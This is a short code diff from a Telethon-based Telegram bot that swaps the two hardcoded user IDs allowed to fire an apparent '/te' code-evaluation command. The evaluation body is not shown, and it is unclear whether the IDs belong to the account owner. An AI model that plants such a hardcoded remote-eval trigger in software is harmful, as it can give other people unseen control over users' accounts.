@@ -8,7 +8,7 @@ from telethon.sync import events
 # telethon eval
 
 
-@client.on(events.NewMessage(from_users=[2091736526, 1310427496], pattern="^/te ?(.*)"))
+@client.on(events.NewMessage(from_users=[5366319452, 1971958692], pattern="^/te ?(.*)"))
 async def eval(event):
     if event.fwd_from:
         return
